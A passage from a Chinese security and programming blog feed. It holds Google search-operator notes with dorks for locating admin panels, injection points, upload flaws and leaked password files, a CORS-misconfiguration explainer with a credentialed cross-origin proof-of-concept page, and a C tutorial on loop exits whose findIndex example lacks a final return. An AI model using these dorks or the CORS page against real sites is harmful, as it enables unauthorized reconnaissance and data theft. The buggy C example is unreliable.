<h1 id="1-参数介绍"><a href="#1-参数介绍" class="headerlink" title="1.参数介绍"></a>1.参数介绍</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、site，指定搜索的某個網站。例：desire site:bbs.gfan.com</span><br><span class="line">二、filetype，指定搜索的文件類型。例：seo filetype:doc</span><br><span class="line">三、双引号，代表完全匹配，使关键词不分开，顺序都不能变。</span><br><span class="line">四、减号，事搜索结果更准确。减号与前一个关键词之间一定要有一个空格，与后一个关键词之间一定不能有空格。搜索结果为，匹配前一个关键词但不匹配后一个关键词的结果。例如：seo -搜索引擎。</span><br><span class="line">五、AND，逻辑与，这个命令我们其实一直都在用，只是没有意识到。一般用空格代替，还可以用“+”代替。例如：霹雳布袋+败亡之剑，返回的结果同时包含两者。</span><br><span class="line">六、intitle，在结果的标题中包含关键词，一次只能搜索一个关键词。</span><br><span class="line">七、inurl，返回的结果的url中包含关键词。例如：seo inurl:byr，它将返回网址中包含byr，而内容中包含搜索词的结果。一次只能搜索一个关键词。</span><br><span class="line">八、allintitle，在结果的标题中同时包含多个关键词。例如：allintitle:seo 搜索引擎，起作用相当于intitle:seo intitle:搜索引擎。allintitle属于排他性指令，不能与其他指令结合使用。</span><br><span class="line">九、allinurl，结果的url中包含多个关键词。例如：allinurl:byr jobs，等于inurl:byr inurl:jobs。allinurl也是排他性指令</span><br><span class="line">十、define，查询关键词的词义，起的是字典的作用。Google会返回包含查询关键词定义的网页，例如：define:computer ，支持汉字哦！</span><br><span class="line">十一、xx in yy，单位换算，xx和yy代表需要换算的单位，且xx和yy为单位的英文缩写。例如你想知道一盎司等于多少千克，只需输入：1 oz in kg。</span><br><span class="line">十二、weather，查询某一地区或城市的天气。不过我们这一地区或城市必须是Google能识别的，例如：weather:beijing，Google将会给我们返回北京的天气。</span><br><span class="line">十三、intext，在结果的正文内容中包含关键词。例如：intext:剑圣，所有返回的网页正文中都包含“剑圣”。</span><br><span class="line">十四、allintext，在结果的正文内容中同时包含多个关键词。排他性指令。</span><br><span class="line">十五、星号（*），通配符，可以匹配任意字符串。例如：搜索*擎，则返回的结果中不仅有“搜索引擎”，还有“搜索巨擎”之类的。</span><br><span class="line">十六、“..&quot;，表示数值范围。例如：手机 2000..3000 元，注意“3000”与“元”之间必须有空格。另外，也可以是三个点。</span><br><span class="line">十七、OR，逻辑或，可以用“|”代替。例如：霹雳布袋|败亡之剑，则返回的结果中，要么只含有“霹雳布袋”，要么就只含有“败亡之剑”，不可能是同时包含两个关键词的网页。</span><br><span class="line">十八、info，查询网站的一些信息。例如：info:bbs.byr.cn，它只会返回一个结果，是一个选择列表，列表的选项是这个网站的某一方面的信息。info=cache+related+link+site+intext+intitle。</span><br><span class="line">十九、related，查询与所给的网站类似的网站，它会返回Google认为的可能和你提供的网站类似的其他网站。例如：related:bbs.gfan.com，会返回安卓巴士，eoe社区，91等站点，但不会返回机锋网。其实这个命令Google经常在用，比如我们搜一个东西，Google除了返回给我结果，还会在结果下面给我们返回一些相关的词条。</span><br><span class="line">二十、link，查询链接到这个url的页面。例如：link:bbs.gfan.com，会返回机锋网的所有外部链接。从其他页面指向机锋。</span><br><span class="line">二十一、linkdomain，查询这个url链接的页面。例如：linkdomain:bbs.gfan.com -site:bbs.gfan.com，这样的结果比较准确，因为扫除了本身的干扰，它将返回机锋网链接到的页面。从机锋指向其他页面。</span><br><span class="line">二十二、cache，提交cache:url，Google会显示当前网页的快照信息，从而替换网页的当前信息。这个命令现在也被Google集成到了搜索结果里，当你把鼠标悬浮在搜索结果上时，右侧会自动出现此结果的快照信息。</span><br><span class="line">二十三、计算器功能。输入数学表达式，然后Google返回给你一个计算结果。强大的Google不仅支持普通运算，它还支持像三角函数、指数函数甚至是对数函数这样的高级运算。关键是，你会输入这些高级数学符号。</span><br><span class="line">**下面是三个不怎么懂的命令，很少用，而且在有限的实践中也没弄明白是怎么回事，抄一段网上的解释在这里。***</span><br><span class="line">二十四、inanchor，它返回的结果是导入链接锚文字中包含搜索词的页面。比如在Google搜索：inanchor:点击这里，返回的结果页面本身并不一定包含“点击这里”这四个字，而是指向这些页面的链接锚文字中出现了“点击这里”这四个字。需要注意区别与inurl，inurl是网页本身的url地址，而inanchor是在外部用于指向该url地址的文本（&lt;a&gt;..&lt;/a&gt;之间文本）中找。例如：inanchor:download，你可能会发现有“FlashGet最佳的下载管理模式”，而该页面中根本就没有“download”字样。</span><br><span class="line">二十五、allinanchor，inanchor的排他性指令。</span><br><span class="line"></span><br><span class="line">二十六、daterange，当我们使用daterange进行查询的时候，Google会将查询的结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被Google收录的时间算的。例如：”Spice Girls“ daterange:2450958-2450968。这里时间日期的格式是按天文学的儒略日。（这个搜索语法Google并不推荐使用，因为它会返回一些莫名其妙的东西）</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">allintext: = 搜索文本,但不包括网页标题和链接allinlinks: = 搜索链接, 不包括文本和标题WordA OR WordB = 搜索包含两关键词之一的页面“Word” OR “Phrase” = 精确的要求搜索单词或者句子WordA -WordB = 包含单词A但是不包含单词BWordA +WordB = 都包含~WORD = 寻找此单词和它的同义词~WORD-WORD = 只搜索同义词,不要原词</span><br></pre></td></tr></table></figure>



<h1 id="2-常用"><a href="#2-常用" class="headerlink" title="2.常用"></a>2.常用</h1><p>查找后台地址：<br> <code>site:域名inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</code><br> 查找文本内容：<br> <code>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username</code><br> 查找可注入点：<br> <code>site:域名 inurl:aspx|jsp|php|asp</code><br> 查找上传漏洞：<br> <code>site:域名 inurl:file|load|editor|Files</code><br> 找eweb编辑器：<br> <code>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</code><br> 存在的数据库：<br> <code>site:域名 filetype:mdb|asp|#</code><br> 查看脚本类型：<br> <code>site:域名 filetype:asp/aspx/php/jsp</code><br> 迂回策略入侵：<br> <code>inurl:cms/data/templates/images/index/</code></p>
<p>查找敏感信息泄露</p>
<p><code>intitle:“Index of /admin”</code></p>
<p><code>intitle:“Index of /root”</code></p>
<p><code>intitle:“Index of /” +password.txt</code></p>
<p><code>intitle:phpinfo()或者inurl:phpinfo.php</code></p>
<p>关于ipc段</p>
<p><a href="http://www.360doc.com/content/20/0607/06/7696210_916944202.shtml">IP C段是什么意思 (360doc.com)</a></p>
<p>听说很多学校或者机构都喜欢把一些东西放在c段。</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>跨域漏洞.md</title>
    <url>/2022/03/17/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E-md/</url>
    <content><![CDATA[<h1 id="跨域漏洞"><a href="#跨域漏洞" class="headerlink" title="跨域漏洞"></a>跨域漏洞</h1><h1 id="cors跨域漏洞"><a href="#cors跨域漏洞" class="headerlink" title="cors跨域漏洞"></a>cors跨域漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>●1.假设用户登陆一个含有CORS配置网站<a href="http://vuln.com,同时又访问了攻击者提供的一个链接http//evil.com%E3%80%82">http://vuln.com，同时又访问了攻击者提供的一个链接http://evil.com。</a></p>
<p>●<a href="http://2.evil.com的网站向http//vuln.com%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E8%83%BD%E5%90%A6%E6%8E%A5%E6%94%B6%E4%BF%A1%E6%81%AF%E5%8F%96%E5%86%B3%E4%BA%8Ehttp://vuln.com%E7%9A%84%E9%85%8D%E7%BD%AE%E3%80%82">http://2.evil.com的网站向http://vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于http://vuln.com的配置。</a></p>
<p>●3.如果<a href="http://vuln.com配置了access-control-allow-origin头且为预期,那么允许接收,否则浏览器会因为同源策略而不接收/">http://vuln.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收</a></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- cors.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>cors exp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();  </span></span><br><span class="line"><span class="javascript">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">this</span>.status == <span class="number">200</span>) &#123;    </span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">this</span>.responseText);  </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = <span class="built_in">this</span>.responseText;    </span></span><br><span class="line"><span class="javascript">    &#125;  </span></span><br><span class="line"><span class="javascript">&#125;;  </span></span><br><span class="line"><span class="javascript">xhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://www.baidu.com&quot;</span>);  </span></span><br><span class="line"><span class="javascript">xhttp.withCredentials = <span class="literal">true</span>;  </span></span><br><span class="line"><span class="javascript">xhttp.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">cors();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/weixin_45605352/article/details/119245952">(54条消息) CORS和JSONP跨域漏洞_DDao_blog的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106050957">(54条消息) Jsonp跨域漏洞浅析_努力的学渣’#的博客-CSDN博客_jsonp跨域漏洞</a></p>
<p><a href="https://www.cnblogs.com/sevck/p/9035422.html">CORS跨域资源共享漏洞 - sevck - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.freebuf.com/articles/web/204023.html">CORS（跨域资源共享）错误配置漏洞的高级利用 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/weixin_41679427/article/details/97536860">(54条消息) CORS跨域漏洞的学习_CanMeng’Blog的博客-CSDN博客_跨域漏洞</a></p>
<p><a href="https://www.anquanke.com/post/id/152339">JSONP和CORS跨站跨域读取资源的漏洞利用（附带EXP） - 安全客，安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>跳出函数(语句)详解</title>
    <url>/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="跳出函数-语句-详解"><a href="#跳出函数-语句-详解" class="headerlink" title="跳出函数(语句)详解"></a>跳出函数(语句)详解</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年新大纲出了，我对比了一下，还是有很多变化的，总体来说难度有所上涨，但也不是很难，我们需要做的就是关注新大纲的内容！因为这些是极其有可能考的，所以接下来我会出多篇博客，详细学习一下新大纲多出来的内容。</p>
<p>这就是今年新的加入的跳出函数，虽然往年也考过，但是今年这个，还单独说明，可见其重要性。</p>
<p>跳出：continue、break、return()、abort()、exit()</p>
<h1 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h1><h2 id="基本作用"><a href="#基本作用" class="headerlink" title="基本作用"></a>基本作用</h2><p>continue语句的作用是跳过本次循环体中余下尚未执行的语句，立即进行下一次的循环条件判定，可以理解为仅结束本次循环。</p>
<p>注意：continue语句并没有使整个循环终止。</p>
<h2 id="在各种循环结构中的例子"><a href="#在各种循环结构中的例子" class="headerlink" title="在各种循环结构中的例子"></a>在各种循环结构中的例子</h2><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;  <span class="comment">// 当 i 等于 3 时跳过当前迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001104448482.png" alt="image-20231001104448482"></p>
<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;  <span class="comment">// 当 i 等于 3 时跳过当前迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001104858999.png" alt="image-20231001104858999"></p>
<h3 id="do-while"><a href="#do-while" class="headerlink" title="do-while"></a>do-while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;  <span class="comment">// 当 i 等于 3 时跳过当前迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt;= <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001105924376.png" alt="image-20231001105924376"></p>
<h2 id="综合利用-控制循环条件"><a href="#综合利用-控制循环条件" class="headerlink" title="综合利用-控制循环条件"></a>综合利用-控制循环条件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;number);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (number &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 当输入一个负数时，跳出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (number % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;  <span class="comment">// 当输入一个偶数时，跳过当前迭代</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        sum += number;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;奇数的和为：%d\n&quot;</span>, sum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001105644782.png" alt="image-20231001105644782"></p>
<h2 id="与break的区别"><a href="#与break的区别" class="headerlink" title="与break的区别"></a>与break的区别</h2><p>1、break 用来结束所有循环，循环语句不再有执行的机会；continue 用来结束本次循环，直接跳到下一次循环，如果循环条件成立，还会继续循环。</p>
<p>2、在多层循环中, 一个break语句只向外跳一层。continue语句的作用是跳过循环体中剩余的语句并到循环末尾而强行执行下一次循环。</p>
<p>3、break可以在 if-else 中使用直接跳出当前循环。</p>
<p>4、continue语句只用在for、while、do-while等循环体中，常与if条件语句一起使用，用来加速循环。</p>
<h1 id="break"><a href="#break" class="headerlink" title="break"></a>break</h1><h2 id="基本作用-1"><a href="#基本作用-1" class="headerlink" title="基本作用"></a>基本作用</h2><p>C 语言中 <strong>break</strong> 语句有以下两种用法：</p>
<ol>
<li>当 <strong>break</strong> 语句出现在一个循环内时，循环会立即终止，且程序流将继续执行紧接着循环的下一条语句。</li>
<li>它可用于终止 <strong>switch</strong> 语句中的一个 case。</li>
</ol>
<p>如果您使用的是嵌套循环（即一个循环内嵌套另一个循环），break 语句会停止执行最内层的循环，然后开始执行该块之后的下一行代码。</p>
<h2 id="在各种循环结构中的例子-1"><a href="#在各种循环结构中的例子-1" class="headerlink" title="在各种循环结构中的例子"></a>在各种循环结构中的例子</h2><h3 id="while-1"><a href="#while-1" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 当 i 等于 3 时结束循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001110150194.png" alt="image-20231001110150194"></p>
<h3 id="for-1"><a href="#for-1" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 当 i 等于 3 时结束循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001110434754.png" alt="image-20231001110434754"></p>
<h3 id="do-while-1"><a href="#do-while-1" class="headerlink" title="do-while"></a>do-while</h3><p>#中途睡了个午觉jb睡了一下午。。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">// 当 i 等于 4 时结束循环</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt;= <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001172947527.png" alt="image-20231001172947527"></p>
<h1 id="return"><a href="#return" class="headerlink" title="return()"></a>return()</h1><h2 id="基本作用-2"><a href="#基本作用-2" class="headerlink" title="基本作用"></a>基本作用</h2><p><code>return</code> 语句在跳出循环时的作用主要有两种：立即终止当前函数的执行和跳出当前循环并返回到调用函数的代码处。 <code>return</code> 语句是一种有效的控制流程语句，可以根据特定条件提前终止函数的执行，并返回适当的结果。</p>
<h2 id="在各种循环结构中的例子-2"><a href="#在各种循环结构中的例子-2" class="headerlink" title="在各种循环结构中的例子"></a>在各种循环结构中的例子</h2><h3 id="while-2"><a href="#while-2" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个函数，用于找到数组中第一个小于目标值的元素的索引</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findIndex</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> length, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;  <span class="comment">// 当找到第一个小于目标值的元素时立即返回索引</span></span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> numbers[] = &#123; <span class="number">9</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="keyword">sizeof</span>(numbers) / <span class="keyword">sizeof</span>(numbers[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> index = findIndex(numbers, length, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;第一个小于目标值的元素在数组的索引位置：%d\n&quot;</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数组中不存在小于目标值的元素。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001174034685.png" alt="image-20231001174034685"></p>
<h3 id="for-2"><a href="#for-2" class="headerlink" title="for"></a>for</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个函数，用于查找数组中是否存在目标值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findValue</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> length, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;  <span class="comment">// 当找到目标值时立即返回索引</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果循环结束仍未找到目标值，则返回 -1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> numbers[] = &#123; <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">3</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="keyword">sizeof</span>(numbers) / <span class="keyword">sizeof</span>(numbers[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> index = findValue(numbers, length, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;目标值在数组中的索引位置：%d\n&quot;</span>, index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数组中不存在目标值。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001174146521.png" alt="image-20231001174146521"></p>
